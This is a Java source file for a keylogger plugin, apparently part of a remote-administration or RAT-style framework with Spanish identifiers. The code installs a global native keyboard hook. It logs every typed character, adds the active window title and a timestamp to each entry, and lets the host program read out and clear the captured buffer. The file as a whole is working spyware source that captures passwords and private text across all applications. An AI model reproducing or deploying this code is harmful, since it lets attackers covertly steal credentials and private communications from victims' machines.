package plugin.keylogger;

import comunes.Interfaz;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.swing.SwingUtilities;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.NativeInputEvent;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements Interfaz, NativeKeyListener {

    private StringBuffer buffer = new StringBuffer();
    private Interfaz jnaUtil = null;
    private String titutuloVentana = "";
    private boolean activo;

    private void vaciar() {
        buffer = new StringBuffer();
    }

    private void iniciar() {
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.getInstance().addNativeKeyListener(this);
//          GlobalScreen.getInstance().addNativeMouseListener(this);
//          GlobalScreen.getInstance().addNativeMouseMotionListener(this);
//          GlobalScreen.getInstance().addNativeMouseWheelListener(this);
            try {
                jnaUtil = ((Interfaz) Class.forName("plugin.jna.JnaUtil").newInstance());
            } catch (Exception ex) {
                jnaUtil = null;
            }
            activo = true;
        } catch (NativeHookException ex) {

        }
    }

    private void detener() {
        GlobalScreen.unregisterNativeHook();
        GlobalScreen.getInstance().removeNativeKeyListener(this);
        jnaUtil = null;
        activo = false;
//      GlobalScreen.getInstance().removeNativeMouseListener(this);
//      GlobalScreen.getInstance().removeNativeMouseMotionListener(this);
//      GlobalScreen.getInstance().removeNativeMouseWheelListener(this);
    }

    private String getChar(String evento) {
        try {
            //NATIVE_KEY_TYPED,keyCode=0,keyText=No Definido,keyChar='h',keyLocation=KEY_LOCATION_STANDARD,rawCode=43
            //NATIVE_KEY_TYPED,keyCode=0,keyText=No Definido,keyChar=Retroceso,keyLocation=KEY_LOCATION_STANDARD,rawCode=22
            //System.out.println("Evento>" + evento);

            String tmp = evento.substring(evento.indexOf("keyChar="));
            tmp = tmp.substring(8, tmp.indexOf(","));
            String modificador = null;
            try {
                modificador = evento.substring(evento.indexOf("modifiers="));
                modificador = modificador.substring(10, modificador.indexOf(","));
            } catch (Exception e) {

            }

            //la tecla
            try {
                String tmp2 = tmp.toLowerCase();
                if (tmp2.equals("retroceso") || tmp2.equals("back")) {
                    tmp = "<Retroceso>";
                }
                if (tmp2.equals("intro")) {
                    tmp = "<Intro>";
                }
                if (tmp2.equals("tabulador") || tmp2.equals("tab")) {
                    tmp = "<Tabulador>";
                }

                if (tmp2.equals("escape")) {
                    tmp = "<Escape>";
                }
                if (tmp.startsWith("'")) {
                    tmp = tmp.substring(1, tmp.lastIndexOf("'"));
                }
            } catch (Exception e) {

            }
            //el modificador
            if (modificador != null) {
                try {
                    String tmp2 = modificador.toLowerCase();
                    if (tmp2.equals("ctrl")) {
                        tmp = "<Ctrl>" + tmp;
                    }
                    if (tmp2.equals("alt")) {
                        tmp = "<Alt>" + tmp;
                    }
//                if (tmp2.equals("mayús")) {
//                    tmp = "";
//                }

                } catch (Exception e) {

                }
            }
            return tmp;
        } catch (Exception e) {
            return null;
        }
    }

    private void procesaKeyEvent(final NativeInputEvent paramNativeInputEvent) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                try {
                    if (jnaUtil != null) {
                        String nuevoTitulo = (String) jnaUtil.get(0);
                        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                        if (!titutuloVentana.equals(nuevoTitulo)) {
                            titutuloVentana = nuevoTitulo;
                            buffer.append("\n\n");
                            buffer.append("==============================================\n");
                            buffer.append("\t").append(titutuloVentana).append("\t").append(sdf.format(new Date()));
                            buffer.append("\n==============================================\n");
                            buffer.append("\n");
                        }
                    }

//                buffer.append(paramNativeInputEvent.paramString());
                    buffer.append(getChar(paramNativeInputEvent.paramString()));
//                System.out.print(getChar(paramNativeInputEvent.paramString()));
//                System.out.println(paramNativeInputEvent.paramString());
//                System.out.println("char=" + getChar(paramNativeInputEvent.paramString()));
//                System.out.println("ID=" + paramNativeInputEvent.getID());
//                System.out.println("modificador=" + paramNativeInputEvent.getModifiers());
//                System.out.println("when=" + paramNativeInputEvent.getWhen());
//                System.out.println("source=" + paramNativeInputEvent.getSource());
                } catch (Exception e) {

                }
            }
        });
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent paramNativeKeyEvent) {
//        procesaKeyEvent(paramNativeKeyEvent);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent paramNativeKeyEvent) {
//        procesaKeyEvent(paramNativeKeyEvent);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent paramNativeKeyEvent) {
        procesaKeyEvent(paramNativeKeyEvent);
    }

    @Override
    public void instanciar(Object... parametros) {

    }

    @Override
    public void set(int opcion, Object valor) {

    }

    @Override
    public Object get(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                return activo;
            case 1:
                return buffer.toString();
        }
        return null;
    }

    @Override
    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                iniciar();
                break;
            case 1:
                detener();
                break;
            case 2:
                vaciar();
                break;
        }
    }

}
